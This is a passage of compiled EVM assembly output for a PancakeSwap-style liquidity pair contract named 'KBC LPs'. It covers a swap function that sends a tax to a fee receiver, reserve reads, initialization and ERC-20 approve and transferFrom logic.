\"src/exchange-protocol/contracts/PancakePair.sol\":13350:13360  FeeResiver */\n      sload(0x06)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13327:13367  _safeTransfer(_token1, FeeResiver, tax1) */\n      tag_153\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13341:13348  _token1 */\n      dup5\n      swap1\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13350:13360  FeeResiver */\n      and\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13362:13366  tax1 */\n      dup4\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13327:13340  _safeTransfer */\n      tag_142\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13327:13367  _safeTransfer(_token1, FeeResiver, tax1) */\n      jump\t// in\n    tag_153:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13426:13466  IERC20(_token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13460:13464  this */\n      address\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13426:13466  IERC20(_token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13426:13451  IERC20(_token0).balanceOf */\n      dup7\n      and\n      swap2\n      0x70a08231\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13426:13466  IERC20(_token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n      0x20\n      swap3\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13426:13451  IERC20(_token0).balanceOf */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13426:13466  IERC20(_token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_154\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_154:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13426:13466  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_155\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_155:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13426:13466  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_156\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_156:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13426:13466  IERC20(_token0).balanceOf(address(this)) */\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13491:13531  IERC20(_token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13525:13529  this */\n      address\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13491:13531  IERC20(_token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13426:13466  IERC20(_token0).balanceOf(address(this)) */\n      swap2\n      swap10\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13491:13516  IERC20(_token1).balanceOf */\n      dup6\n      and\n      swap2\n      0x70a08231\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13491:13531  IERC20(_token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13426:13466  IERC20(_token0).balanceOf(address(this)) */\n      0x20\n      swap3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13491:13531  IERC20(_token1).balanceOf(address(this)) */\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13491:13516  IERC20(_token1).balanceOf */\n      dup7\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13491:13531  IERC20(_token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_157\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_157:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13491:13531  IERC20(_token1).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_158\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_158:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13491:13531  IERC20(_token1).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_159\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_159:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13491:13531  IERC20(_token1).balanceOf(address(this)) */\n      mload\n      swap7\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13551:13565  uint amount0In */\n      0x00\n      swap6\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13579:13601  _reserve0 - amount0Out */\n      dup6\n      and\n      dup11\n      swap1\n      sub\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13568:13601  balance0 > _reserve0 - amount0Out */\n      dup4\n      gt\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13568:13667  balance0 > _reserve0 - amount0Out... */\n      tag_160\n      jumpi\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13666:13667  0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13568:13667  balance0 > _reserve0 - amount0Out... */\n      jump(tag_161)\n    tag_160:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13640:13650  amount0Out */\n      dup10\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13628:13637  _reserve0 */\n      dup6\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13628:13650  _reserve0 - amount0Out */\n      and\n      sub\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13616:13624  balance0 */\n      dup4\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13616:13651  balance0 - (_reserve0 - amount0Out) */\n      sub\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13568:13667  balance0 > _reserve0 - amount0Out... */\n    tag_161:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13551:13667  uint amount0In = balance0 > _reserve0 - amount0Out... */\n      swap1\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13677:13691  uint amount1In */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13717:13727  amount1Out */\n      dup10\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13705:13714  _reserve1 */\n      dup6\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13705:13727  _reserve1 - amount1Out */\n      and\n      sub\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13694:13702  balance1 */\n      dup4\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13694:13727  balance1 > _reserve1 - amount1Out */\n      gt\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13694:13793  balance1 > _reserve1 - amount1Out... */\n      tag_162\n      jumpi\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13792:13793  0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13694:13793  balance1 > _reserve1 - amount1Out... */\n      jump(tag_163)\n    tag_162:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13766:13776  amount1Out */\n      dup10\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13754:13763  _reserve1 */\n      dup6\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13754:13776  _reserve1 - amount1Out */\n      and\n      sub\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13742:13750  balance1 */\n      dup4\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13742:13777  balance1 - (_reserve1 - amount1Out) */\n      sub\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13694:13793  balance1 > _reserve1 - amount1Out... */\n    tag_163:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13677:13793  uint amount1In = balance1 > _reserve1 - amount1Out... */\n      swap1\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13836:13837  0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13824:13833  amount0In */\n      dup3\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13824:13837  amount0In > 0 */\n      gt\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13824:13854  amount0In > 0 || amount1In > 0 */\n      dup1\n      tag_164\n      jumpi\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13853:13854  0 */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13841:13850  amount1In */\n      dup2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13841:13854  amount1In > 0 */\n      gt\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13824:13854  amount0In > 0 || amount1In > 0 */\n    tag_164:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":13803:13914  require(... */\n      tag_165\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x22\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_50b0a6dd250a09c1cd083ad4bf9f97424665d60e7bc0a208a1151c7d0051999c\n      0x22\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_165:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14014:14035  uint balance0Adjusted */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14056:14098  balance0.mul(10000).sub(amount0In.mul(25)) */\n      tag_166\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14080:14097  amount0In.mul(25) */\n      tag_167\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14080:14089  amount0In */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14094:14096  25 */\n      0x19\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14080:14097  amount0In.mul(25) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14080:14093  amount0In.mul */\n      tag_168\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14080:14097  amount0In.mul(25) */\n      and\n      jump\t// in\n    tag_167:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14056:14075  balance0.mul(10000) */\n      tag_169\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14056:14064  balance0 */\n      dup8\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14069:14074  10000 */\n      0x2710\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14056:14075  balance0.mul(10000) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14056:14068  balance0.mul */\n      tag_168\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14056:14075  balance0.mul(10000) */\n      and\n      jump\t// in\n    tag_169:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14056:14079  balance0.mul(10000).sub */\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14056:14098  balance0.mul(10000).sub(amount0In.mul(25)) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14056:14079  balance0.mul(10000).sub */\n      tag_170\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14056:14098  balance0.mul(10000).sub(amount0In.mul(25)) */\n      and\n      jump\t// in\n    tag_166:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14014:14112  uint balance0Adjusted = (... */\n      swap1\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14126:14147  uint balance1Adjusted */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14168:14210  balance1.mul(10000).sub(amount1In.mul(25)) */\n      tag_171\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14192:14209  amount1In.mul(25) */\n      tag_167\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14192:14201  amount1In */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14206:14208  25 */\n      0x19\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14192:14209  amount1In.mul(25) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14192:14205  amount1In.mul */\n      tag_168\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14192:14209  amount1In.mul(25) */\n      and\n      jump\t// in\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14168:14210  balance1.mul(10000).sub(amount1In.mul(25)) */\n    tag_171:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14126:14224  uint balance1Adjusted = (... */\n      swap1\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14325:14371  uint(_reserve0).mul(_reserve1).mul(10000 ** 2) */\n      tag_174\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14360:14370  10000 ** 2 */\n      0x05f5e100\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14325:14355  uint(_reserve0).mul(_reserve1) */\n      tag_175\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14325:14340  uint(_reserve0) */\n      dup12\n      dup2\n      and\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14325:14355  uint(_reserve0).mul(_reserve1) */\n      dup12\n      and\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14325:14344  uint(_reserve0).mul */\n      tag_168\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14325:14355  uint(_reserve0).mul(_reserve1) */\n      and\n      jump\t// in\n    tag_175:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14325:14359  uint(_reserve0).mul(_reserve1).mul */\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14325:14371  uint(_reserve0).mul(_reserve1).mul(10000 ** 2) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14325:14359  uint(_reserve0).mul(_reserve1).mul */\n      tag_168\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14325:14371  uint(_reserve0).mul(_reserve1).mul(10000 ** 2) */\n      and\n      jump\t// in\n    tag_174:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14263:14301  balance0Adjusted.mul(balance1Adjusted) */\n      tag_176\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14263:14279  balance0Adjusted */\n      dup4\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14284:14300  balance1Adjusted */\n      dup4\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14263:14301  balance0Adjusted.mul(balance1Adjusted) */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14263:14283  balance0Adjusted.mul */\n      tag_168\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14263:14301  balance0Adjusted.mul(balance1Adjusted) */\n      and\n      jump\t// in\n    tag_176:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14263:14371  balance0Adjusted.mul(balance1Adjusted) >=... */\n      lt\n      iszero\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14238:14415  require(... */\n      tag_177\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0a\n      0x24\n      dup3\n      add\n      mstore\n      shl(0xb0, 0x50616e63616b653a204b)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_177:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1357:1358  _ */\n      pop\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14436:14485  _update(balance0, balance1, _reserve0, _reserve1) */\n      tag_178\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14444:14452  balance0 */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14454:14462  balance1 */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14464:14473  _reserve0 */\n      dup9\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14475:14484  _reserve1 */\n      dup9\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14436:14443  _update */\n      tag_179\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14436:14485  _update(balance0, balance1, _reserve0, _reserve1) */\n      jump\t// in\n    tag_178:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14500:14566  Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to) */\n      0x40\n      dup1\n      mload\n      dup4\n      dup2\n      mstore\n      0x20\n      dup2\n      add\n      dup4\n      swap1\n      mstore\n      dup1\n      dup3\n      add\n      dup14\n      swap1\n      mstore\n      0x60\n      dup2\n      add\n      dup13\n      swap1\n      mstore\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n      dup12\n      and\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14505:14515  msg.sender */\n      caller\n      swap2\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":14500:14566  Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to) */\n      0xd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d822\n      swap2\n      dup2\n      swap1\n      sub\n      0x80\n      add\n      swap1\n      log3\n      pop\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1379:1380  1 */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1368:1376  unlocked */\n      0x0f\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1368:1380  unlocked = 1 */\n      sstore\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":11720:14573  function swap(... */\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":217:256  string public constant name = \"KBC LPs\" */\n    tag_48:\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x07\n      dup2\n      mstore\n      0x20\n      add\n      shl(0xc8, 0x4b4243204c5073)\n      dup2\n      mstore\n      pop\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1393:1694  function getReserves()... */\n    tag_54:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1599:1607  reserve0 */\n      sload(0x0b)\n      sub(shl(0x70, 0x01), 0x01)\n      dup1\n      dup3\n      and\n      swap3\n      shl(0x70, 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1629:1637  reserve1 */\n      dup4\n      div\n      swap1\n      swap2\n      and\n      swap2\n      shl(0xe0, 0x01)\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1669:1687  blockTimestampLast */\n      swap1\n      div\n      0xffffffff\n      and\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":1393:1694  function getReserves()... */\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2852:2999  function approve(address spender, uint256 value) external returns (bool) {... */\n    tag_57:\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2919:2923  bool */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2935:2971  _approve(msg.sender, spender, value) */\n      tag_182\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2944:2954  msg.sender */\n      caller\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2956:2963  spender */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2965:2970  value */\n      dup5\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2935:2943  _approve */\n      tag_183\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2935:2971  _approve(msg.sender, spender, value) */\n      jump\t// in\n    tag_182:\n      pop\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2988:2992  true */\n      0x01\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":2852:2999  function approve(address spender, uint256 value) external returns (bool) {... */\n    tag_181:\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":700:721  address public token0 */\n    tag_59:\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x08))\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":2591:2865  function initialize(... */\n    tag_62:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":2730:2737  factory */\n      and(sub(shl(0xa0, 0x01), 0x01), sload(0x07))\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":2716:2726  msg.sender */\n      caller\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":2716:2737  msg.sender == factory */\n      eq\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":2708:2760  require(msg.sender == factory, \"Pancake: FORBIDDEN\") */\n      tag_185\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x12\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x71, 0x2830b731b0b5b29d102327a92124a22222a7)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_185:\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":2790:2796  token0 */\n      0x08\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":2790:2806  token0 = _token0 */\n      dup1\n      sload\n      sub(shl(0xa0, 0x01), 0x01)\n      swap5\n      dup6\n      and\n      not(sub(shl(0xa0, 0x01), 0x01))\n      swap2\n      dup3\n      and\n      or\n      swap1\n      swap2\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":2816:2822  token1 */\n      0x09\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":2816:2832  token1 = _token1 */\n      dup1\n      sload\n      swap4\n      swap1\n      swap5\n      and\n      swap3\n      and\n      swap2\n      swap1\n      swap2\n      or\n      swap1\n      swap2\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":2842:2848  taxfee */\n      0x0a\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":2842:2858  taxfee = _taxfee */\n      sstore\n        /* \"src/exchange-protocol/contracts/PancakePair.sol\":2591:2865  function initialize(... */\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":349:375  uint256 public totalSupply */\n    tag_64:\n      sload(0x00)\n      dup2\n      jump\t// out\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3150:3511  function transferFrom(... */\n    tag_67:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3281:3296  allowance[from] */\n      dup4\n      and\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3261:3265  bool */\n      0x00\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3281:3296  allowance[from] */\n      swap1\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3281:3290  allowance */\n      0x02\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3281:3296  allowance[from] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3297:3307  msg.sender */\n      caller\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3281:3308  allowance[from][msg.sender] */\n      dup5\n      mstore\n      swap1\n      swap2\n      mstore\n      dup2\n      keccak256\n      sload\n      not(0x00)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3281:3323  allowance[from][msg.sender] != uint256(-1) */\n      eq\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3277:3448  if (allowance[from][msg.sender] != uint256(-1)) {... */\n      tag_187\n      jumpi\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3369:3384  allowance[from] */\n      dup5\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3369:3378  allowance */\n      0x02\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3369:3384  allowance[from] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3385:3395  msg.sender */\n      caller\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3369:3396  allowance[from][msg.sender] */\n      dup5\n      mstore\n      swap1\n      swap2\n      mstore\n      swap1\n      keccak256\n      sload\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3369:3437  allowance[from][msg.sender].sub(... */\n      tag_188\n      swap1\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3418:3423  value */\n      dup4\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3369:3437  allowance[from][msg.sender].sub(... */\n      0xffffffff\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3369:3400  allowance[from][msg.sender].sub */\n      tag_170\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3369:3437  allowance[from][msg.sender].sub(... */\n      and\n      jump\t// in\n    tag_188:\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3339:3354  allowance[from] */\n      dup6\n      and\n      0x00\n      swap1\n      dup2\n      mstore\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3339:3348  allowance */\n      0x02\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3339:3354  allowance[from] */\n      0x20\n      swap1\n      dup2\n      mstore\n      0x40\n      dup1\n      dup4\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3355:3365  msg.sender */\n      caller\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3339:3366  allowance[from][msg.sender] */\n      dup5\n      mstore\n      swap1\n      swap2\n      mstore\n      swap1\n      keccak256\n        /* \"src/exchange-protocol/contracts/PancakeERC20.sol\":3339:3437  allowance[from][msg.sender] = 